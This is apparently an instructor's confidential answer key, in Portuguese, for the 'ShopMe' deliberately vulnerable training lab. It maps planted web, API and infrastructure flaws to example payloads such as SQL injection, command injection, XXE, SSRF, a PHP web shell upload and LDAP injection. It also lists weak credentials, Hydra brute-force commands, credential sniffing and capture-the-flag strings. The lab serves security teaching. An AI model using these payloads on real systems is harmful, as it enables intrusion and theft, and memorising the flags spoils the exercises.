# ShopMe: Mapa & Checklist de Vulnerabilidades (Guia do Instrutor)

> [!IMPORTANT]
> **DOCUMENTO CONFIDENCIAL DE INSTRUTOR / LABORATÓRIO**
> Este ficheiro situa-se fora da pasta pública (`public/`) e não é acessível via servidor web. Deve ser consultado exclusivamente por instrutores ou administradores do ambiente de treino.

---

## Índice de Vulnerabilidades (Seções A - F)

| ID | Categoria | Vulnerabilidade | Rota / Endpoint | Ficheiro Fonte | Payload / Método Exemplo |
|---|---|---|---|---|---|
| A1 | Server-Side | SQL Injection Clássica | `POST /login` | `src/App/Models/User.php` | `admin@shopme.local' --` |
| A2 | Server-Side | SQL Injection Clássica (Search) | `GET /products?q=` | `src/App/Models/Product.php` | `' UNION SELECT 1,2,email,password,5,6,7,8,9,10,11,12 FROM users--` |
| A3 | Server-Side | SQL Injection em 2.º Grau | `GET /admin/reports/user` | `src/App/Controllers/AdminController.php` | Injetar `' OR '1'='1` no `display_name` via `/profile/update` |
| A4 | Server-Side | Command Injection / RCE | `POST /admin/reports/generate` | `src/App/Controllers/AdminController.php` | `report; id; cat /etc/passwd` no parâmetro `title` |
| A5 | Server-Side | RCE via Upload de Ficheiro | `POST /profile/avatar` | `src/App/Controllers/ProfileController.php` | Upload de `shell.php` -> `/uploads/avatars/shell.php?cmd=whoami` |
| A6 | Server-Side | Insecure Deserialization | `GET /profile` | `src/App/Services/ReportService.php` | Cookie `shopme_prefs` com Gadget `ReportService` (`action: exec`) |
| A7 | Server-Side | XXE (XML External Entity) | `POST /admin/products/import-xml` | `src/App/Services/XmlImportService.php` | XML com `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| A8 | Server-Side | SSRF | `GET /api/v1/external/check-price` | `src/App/Controllers/ExternalApiController.php` | `?url=http://127.0.0.1:8080/api/v1/users/1` ou `http://169.254.169.254` |
| A9 | Server-Side | LFI / RFI | `GET /orders/email/template` | `src/App/Controllers/OrderController.php` | `?tpl=../../../../etc/passwd` |
| A10 | Server-Side | Path Traversal | `GET /orders/invoice/download` | `src/App/Controllers/OrderController.php` | `?file=../../../../etc/passwd` |
| A11 | Server-Side | Mass Assignment | `POST /profile/update` | `src/App/Controllers/ProfileController.php` | Adicionar parâmetro POST `role=admin` ou `is_admin=1` |
| A12 | Server-Side | IDOR (Order Access) | `GET /orders/{id}` | `src/App/Controllers/OrderController.php` | Aceder a `/orders/1` estando autenticado como cliente 2 |
| A13 | Server-Side | Broken Access Control | `POST /admin/users/delete`, `GET /admin/logs` | `src/App/Controllers/AdminController.php` | Aceder diretamente sem cookie de sessão admin |
| A14 | Server-Side | Race Condition (Cupões) | `POST /cart/apply-coupon` | `src/App/Models/Coupon.php` | Requisições concorrentes com cupão `VIP50` |
| B1 | Client-Side | XSS Refletido | `GET /login?error=` & `GET /products?q=` | `views/auth/login.php`, `views/products/index.php` | `?error=<script>alert('XSS')</script>` |
| B2 | Client-Side | XSS Armazenado | Avaliações / Tickets / Mensagens | `views/products/detail.php`, `views/support/detail.php` | Submeter comentário com `<script>fetch('/api/v1/users/1').then(...)</script>` |
| B3 | Client-Side | XSS DOM-based | `GET /?promo=` ou `GET /#ref=` | `public/static/js/main.js` | `http://localhost:8080/#ref=<img src=x onerror=alert(1)>` |
| B4 | Client-Side | CSRF | `POST /profile/update`, `POST /cart/add` | `src/App/Controllers/ProfileController.php` | Formulário HTML externo submetendo requisição POST sem token |
| B5 | Client-Side | Clickjacking | Painel `/admin` | `nginx.conf` | Enquadrar site num `<iframe>` devido à ausência de `X-Frame-Options` |
| B6 | Client-Side | Open Redirect | `POST /login` | `src/App/Controllers/AuthController.php` | `POST /login` com `redirect=https://evil.com` |
| C1 | Auth/Sessão | Password Hash Fraco | Tabela `users` (MD5) | `database/seed.sql`, `src/App/Models/User.php` | Quebrar MD5 de `admin` (`0192023a7bbd73250516f069df18b500` -> `admin123`) |
| C2 | Auth/Sessão | Session Fixation | `POST /login` | `src/App/Controllers/AuthController.php` | Cookie `PHPSESSID` predefinido mantido após autenticação |
| C3 | Auth/Sessão | JWT `alg: none` / Weak Secret | `/api/v1/orders/{id}` | `src/App/Services/JwtService.php` | Cabeçalho JWT `{"alg":"none"}` ou assinado com `shopme_jwt_secret_key_2026` |
| C4 | Auth/Sessão | Ausência de Rate Limiting | `POST /login` | `src/App/Controllers/AuthController.php` | Ataque de força bruta / hammering sem bloqueio |
| C5 | Auth/Sessão | Token Reset Previsível | `POST /reset-password` | `src/App/Controllers/AuthController.php` | Token gerado como `md5(email + timestamp)` |
| D1 | Config/Expo | Mensagens de Erro Detalhadas | Erros SQL / PHP | `src/App/Config/Database.php` | Provocar erro sintático com `'` para obter stack trace |
| D2 | Config/Expo | Ficheiros Sensíveis Expostos | Web root `public/` | `public/.env`, `public/backup.sql` | `curl http://localhost:8080/.env` e `http://localhost:8080/backup.sql` |
| D3 | Config/Expo | Diretório Uploads Listável | `/uploads/` | `nginx.conf` | `curl http://localhost:8080/uploads/` (Autoindex Nginx ativo) |
| E1 | API | BOLA / IDOR na API | `GET /api/v1/orders/{id}` | `src/App/Api/ApiOrderController.php` | `GET /api/v1/orders/1` traz encomenda de qualquer utilizador |
| E2 | API | Excessive Data Exposure | `GET /api/v1/products`, `GET /api/v1/users/1` | `src/App/Api/ApiProductController.php` | Resposta inclui `cost_price`, `supplier_contact`, `password_hash` |
| E3 | API | Mass Assignment JSON | `PUT /api/v1/users/{id}` | `src/App/Api/ApiUserController.php` | Body JSON `{"role": "admin"}` |
| E4 | API | CORS Mal Configurado | Resposta de API | `src/App/Middleware/CorsMiddleware.php` | Cabeçalho `Access-Control-Allow-Origin: *` com `Allow-Credentials: true` |
| **F1** | **Secção F** | **MFA Bypass & Parameter Tampering** | `POST /mfa/verify` | `src/App/Controllers/MfaController.php` | Enviar parâmetro POST/Cookie `mfa_passed=1` para ignorar verificação |
| **F2** | **Secção F** | **MFA OTP Estático / Sem Expiração** | `POST /mfa/verify` | `src/App/Controllers/MfaController.php` | Código OTP estático `1234` válido indefinidamente |
| **F3** | **Secção F** | **OAuth Redirect URI Fraco** | `GET /auth/oauth/login` | `src/App/Controllers/OAuthController.php` | `redirect_uri=http://localhost.evil.com/callback` recebe `code` |
| **F4** | **Secção F** | **OAuth CSRF (State Ausente)** | `GET /auth/oauth/login` | `src/App/Controllers/OAuthController.php` | Iniciar fluxo OAuth sem validar parâmetro `state` |
| **F5** | **Secção F** | **Client Secret OAuth Exposto** | `public/static/js/main.js` | `public/static/js/main.js` | VAZAMENTO em JS: `ShopMeOAuth.clientSecret = 'shopme_oauth_secret_8899'` |
| **F6** | **Secção F** | **HTTP Request Smuggling** | Reverse Proxy / Nginx | `nginx.conf` | Encaminhamento de `Transfer-Encoding` e `Content-Length` duplicados |
| **F7** | **Secção F** | **Race Condition: Double Spend Carteira** | `POST /wallet/transfer` | `src/App/Controllers/WalletController.php` | Requisições concorrentes de transferência duplicam débito de saldo |
| **F8** | **Secção F** | **Race Condition: Reembolso Duplo** | `POST /orders/refund` | `src/App/Controllers/OrderController.php` | Requisições concorrentes de reembolso creditam saldo 2x |
| **F9** | **Secção F** | **NoSQL Injection** | `POST /api/v1/users` (Query NoSQL) | `src/App/Services/NoSqlService.php` | Enviar filtro com operadores Mongo: `{"email": {"$ne": null}}` |
| **F10** | **Secção F** | **LDAP Injection** | `POST /login/corporate` | `src/App/Services/LdapService.php` | Username: `corp_admin*)(|(uid=*` contorna verificação de password |
| **F11** | **Secção F** | **ORM Injection** | Dynamic ORM QueryBuilder | `src/App/Services/OrmService.php` | Interpolação crua de chaves de array ou campo `sort` em `ORDER BY` |
| **F12** | **Secção F** | **Prototype Pollution** | Utility JS Client | `public/static/js/main.js` | Executar `ShopMeUtils.deepMerge({}, JSON.parse('{"__proto__":{"polluted":true}}'))` |
| **F13** | **Secção F** | **XPath Injection** | `GET /legacy/catalog/search` | `src/App/Controllers/LegacyCatalogController.php` | Parâmetro `cat=Hardware' or '1'='1` extrai campos `<secret_notes>` do XML |
| **F14** | **Secção F** | **CORS Dynamic Echo & Null Origin** | Respostas de API | `src/App/Middleware/CorsMiddleware.php` | Origin enviado: `null` ou `http://attacker.com` devolve `Allow-Credentials: true` |
| **F15** | **Secção F** | **Hammering / Unthrottled Abuse** | `/login`, `/mfa/verify`, `/register` | Vários Controllers | Ausência total de rate-limiting permite envio de milhares de requisições/seg. |
| **G1** | **Secção G** | **SSH — Root Login (rockyou: toor)** | `ssh://localhost:2222` | `docker/ssh/Dockerfile` | `ssh root@localhost -p 2222` senha `toor` → `cat /root/flag.txt` → `FLAG{G1_ssh_r00t_pwned_with_toor}` |
| **G2** | **Secção G** | **SSH — Config Exfiltration** | `ssh://localhost:2222` | `docker/ssh/Dockerfile` | Qualquer user SSH → `cat /opt/shopme/config.env` → `FLAG{G2_ssh_config_exfiltrated}` |
| **G3** | **Secção G** | **SSH — Backup User (rockyou: 123456)** | `ssh://localhost:2222` | `docker/ssh/Dockerfile` | `ssh backup@localhost -p 2222` senha `123456` → `cat ~/.flag` → `FLAG{G3_ssh_backup_user_123456}` |
| **G4** | **Secção G** | **SSH — Developer (rockyou: password)** | `ssh://localhost:2222` | `docker/ssh/Dockerfile` | `ssh developer@localhost -p 2222` senha `password` → `cat ~/note.txt` → `FLAG{G4_ssh_developer_password_in_rockyou}` |
| **G5** | **Secção G** | **FTP — Login Anónimo** | `ftp://localhost:2121` | `docker/ftp/Dockerfile` | `ftp anonymous@localhost 2121` → `get public/flag.txt` → `FLAG{G5_ftp_anonymous_login_no_password_needed}` |
| **G6** | **Secção G** | **FTP — Cleartext (rockyou: password)** | `ftp://localhost:2121` | `docker/ftp/Dockerfile` | `ftp ftpuser@localhost 2121` senha `password` → `get flag.txt` → `FLAG{G6_ftp_cleartext_creds_ftpuser_password}` |
| **G7** | **Secção G** | **FTP — Admin Pivot (rockyou: letmein)** | `ftp://localhost:2121` | `docker/ftp/Dockerfile` | `ftp ftpadmin@localhost 2121` senha `letmein` → `get private/flag.txt` → `FLAG{G7_ftp_admin_letmein_pivoted}` |
| **G8** | **Secção G** | **Telnet — Guest Cleartext (rockyou: guest)** | `telnet://localhost:2323` | `docker/telnet/Dockerfile` | `telnet localhost 2323` login `guest:guest` → `cat ~/flag.txt` → `FLAG{G8_telnet_guest_login_cleartext_protocol}` |
| **G9** | **Secção G** | **Telnet — Admin Sniffing (rockyou: admin123)** | `telnet://localhost:2323` | `docker/telnet/Dockerfile` | Wireshark `tcp.port==23` → capturar `admin:admin123` → `cat ~/.flag` → `FLAG{G9_telnet_admin_admin123_sniffed}` |
| **G10** | **Secção G** | **Telnet — Root Owned (rockyou: toor)** | `telnet://localhost:2323` | `docker/telnet/Dockerfile` | Brute force `root:toor` → `cat /root/flag.txt` → `FLAG{G10_telnet_root_toor_system_owned}` |
| **G11** | **Secção G** | **MinIO — Bucket Público (S3 Misconfig)** | `http://localhost:9090` | `docker/minio/init-buckets.sh` | `curl http://localhost:9090/shopme-backups/flag.txt` → `FLAG{G11_minio_public_bucket_world_readable}` |
| **G12** | **Secção G** | **MinIO — Dump de Utilizadores MD5** | `http://localhost:9090` | `docker/minio/init-buckets.sh` | CSV público com email+MD5 → quebrar com rockyou → `FLAG{G12_minio_user_dump_md5_cracked_with_rockyou}` |
| **G13** | **Secção G** | **MinIO — Config Full Takeover** | `http://localhost:9090` | `docker/minio/init-buckets.sh` | Config com credenciais de todos os serviços → `FLAG{G13_minio_config_env_exposed_full_takeover}` |
| **G14** | **Secção G** | **MinIO — Console Credenciais Fracas** | `http://localhost:9091` | `docker-compose.yml` | `minioadmin:minioadmin` → bucket privado → `FLAG{G14_minio_console_weak_creds_minioadmin}` |

---

## Guias Rápidos de Exploração — Secção F

### 1. LDAP Injection no Login Corporativo
- **Rota**: `/login/corporate`
- **Username Payload**: `corp_admin*)(|(uid=*`
- **Password**: `qualquer_coisa`
- **Efeito**: A query LDAP expande para `(&(uid=corp_admin*)(|(uid=*)(userPassword=...))` que é avaliada como verdadeira, concedendo sessão SSO de Administrador Corporativo.

### 2. XPath Injection no Catálogo Legado
- **Rota**: `/legacy/catalog/search?cat=Hardware' or '1'='1`
- **Efeito**: A consulta XPath recupera todos os nós `<product>` incluindo o elemento confidencial `<secret_notes>` com chaves de licença e credenciais de fábrica.

### 3. Double-Spend Race Condition na Carteira Digital
- **Rota**: `POST /wallet/transfer`
- **Payload**: `recipient_email=ana@example.com&amount=500`
- **Efeito**: Enviar 10 requisições simultâneas via Turbo Intruder. Como existe um atraso de 150ms antes da atualização do saldo na BD, todas as requisições leem o saldo suficiente inicial (€500.00) e transferem €500.00 cada uma (totalizando €5000.00 transferidos a partir de apenas €500.00).

### 4. Prototype Pollution via Front-end JS
- **Ficheiro**: `public/static/js/main.js`
- **Consola do Browser**:
  ```javascript
  ShopMeUtils.deepMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
  console.log({}.isAdmin); // Returns true (Object prototype polluted!)
  ```

---

## Guias Rápidos de Exploração — Secção G (Infraestrutura)

### Mapa de Credenciais (todas da wordlist rockyou)

| Serviço | Porto | Utilizador | Senha (rockyou) | Flag |
|---|---|---|---|---|
| SSH | 2222 | `root` | `toor` | `FLAG{G1_ssh_r00t_pwned_with_toor}` |
| SSH | 2222 | `admin` | `admin123` | config.env → `FLAG{G2}` |
| SSH | 2222 | `developer` | `password` | `FLAG{G4_ssh_developer_password_in_rockyou}` |
| SSH | 2222 | `backup` | `123456` | `FLAG{G3_ssh_backup_user_123456}` |
| SSH | 2222 | `shopme` | `iloveyou` | config.env → `FLAG{G2}` |
| FTP | 2121 | `anonymous` | *(vazio)* | `FLAG{G5_ftp_anonymous_login_no_password_needed}` |
| FTP | 2121 | `ftpuser` | `password` | `FLAG{G6_ftp_cleartext_creds_ftpuser_password}` |
| FTP | 2121 | `uploads` | `123456` | — |
| FTP | 2121 | `ftpadmin` | `letmein` | `FLAG{G7_ftp_admin_letmein_pivoted}` |
| Telnet | 2323 | `guest` | `guest` | `FLAG{G8_telnet_guest_login_cleartext_protocol}` |
| Telnet | 2323 | `admin` | `admin123` | `FLAG{G9_telnet_admin_admin123_sniffed}` |
| Telnet | 2323 | `operator` | `sunshine` | bonus flag em `/opt/shopme/secret.txt` |
| Telnet | 2323 | `monitor` | `qwerty` | — |
| Telnet | 2323 | `root` | `toor` | `FLAG{G10_telnet_root_toor_system_owned}` |
| MinIO | 9000/9001 | `minioadmin` | `minioadmin` | `FLAG{G14_minio_console_weak_creds_minioadmin}` |

### 5. SSH — Brute Force e PermitRootLogin

```bash
# Acesso directo com senhas rockyou
ssh root@localhost -p 2222           # toor        → FLAG G1
ssh admin@localhost -p 2222          # admin123    → config.env (G2)
ssh developer@localhost -p 2222      # password    → FLAG G4
ssh backup@localhost -p 2222         # 123456      → FLAG G3
ssh shopme@localhost -p 2222         # iloveyou

# Brute force com Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
      -t 10 -s 2222 localhost ssh

# Exfiltrar flags
cat /root/flag.txt                   # → FLAG{G1_ssh_r00t_pwned_with_toor}
cat /opt/shopme/config.env           # → FLAG{G2_ssh_config_exfiltrated}
cat /home/backup/.flag               # → FLAG{G3_ssh_backup_user_123456}
cat /home/developer/note.txt         # → FLAG{G4_ssh_developer_password_in_rockyou}
```

### 6. FTP — Login Anónimo e Cleartext Sniffing

```bash
# Login anónimo → FLAG G5
ftp -n localhost 2121
> user anonymous ""
> ls public/
> get public/flag.txt

# ftpuser (rockyou: password) → FLAG G6
ftp -n localhost 2121
> user ftpuser password
> get flag.txt

# ftpadmin (rockyou: letmein) → FLAG G7
ftp -n localhost 2121
> user ftpadmin letmein
> cd private
> get flag.txt

# Sniffar credenciais cleartext
sudo tcpdump -i lo port 2121 -A -s0 | grep -E 'USER|PASS'

# Hydra
hydra -L ftp_users.txt -P /usr/share/wordlists/rockyou.txt \
      -s 2121 localhost ftp
```

### 7. Telnet — Sniffing de Credenciais em Cleartext

```bash
# Guest (mais fácil) → FLAG G8
telnet localhost 2323
# login: guest / guest → cat ~/flag.txt

# Admin (medium, sniffar primeiro) → FLAG G9
telnet localhost 2323
# login: admin / admin123 → cat ~/.flag

# Root (brute force) → FLAG G10
telnet localhost 2323
# login: root / toor → cat /root/flag.txt

# MOTD vaza credenciais internas automaticamente:
#   DB: shopme_db:3306 (shopme_user / shopme_pass)
#   FTP: shopme_ftp:21 (ftpuser / password)
#   MinIO: shopme_minio:9000 (minioadmin / minioadmin)

# Wireshark: Filtro tcp.port == 2323

# Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
      -s 2323 localhost telnet
```

### 8. MinIO — S3 Bucket Misconfiguration

```bash
# Bucket público sem autenticação
curl http://localhost:9090/shopme-backups/flag.txt            # → FLAG G11
curl http://localhost:9090/shopme-backups/users_export.csv    # → FLAG G12
curl http://localhost:9090/shopme-backups/config.env           # → FLAG G13

# Listar bucket
curl "http://localhost:9090/shopme-backups/?list-type=2"

# Consola MinIO (credenciais fracas)
# http://localhost:9091 → minioadmin:minioadmin
# shopme-private → flag.txt → FLAG G14

# AWS CLI
aws --endpoint-url http://localhost:9090 s3 ls s3://shopme-backups/
aws --endpoint-url http://localhost:9090 s3 cp s3://shopme-private/flag.txt .

# MinIO Client
mc alias set pwned http://localhost:9090 minioadmin minioadmin
mc ls pwned/shopme-backups/
mc cp pwned/shopme-private/flag.txt .    # → FLAG G14
```

